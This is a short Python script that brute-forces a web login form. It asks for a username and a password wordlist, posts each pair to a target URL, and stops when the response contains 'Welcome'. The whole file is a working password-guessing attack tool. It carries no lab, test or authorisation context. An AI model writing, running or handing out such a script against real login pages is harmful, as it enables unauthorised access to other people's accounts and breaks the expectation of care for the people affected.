import requests

def brute_forcer(url):
    username = input("Enter username: ")
    password_file = input("Enter path to password list: ")

    with open(password_file, "r") as file:
        for password in file:
            password = password.strip()
            print(f"Trying: {username}:{password}")
            response = requests.post(url, data={"username": username, "password": password})
            if "Welcome" in response.text:
                print(f"[SUCCESS] Password found: {password}")
                break
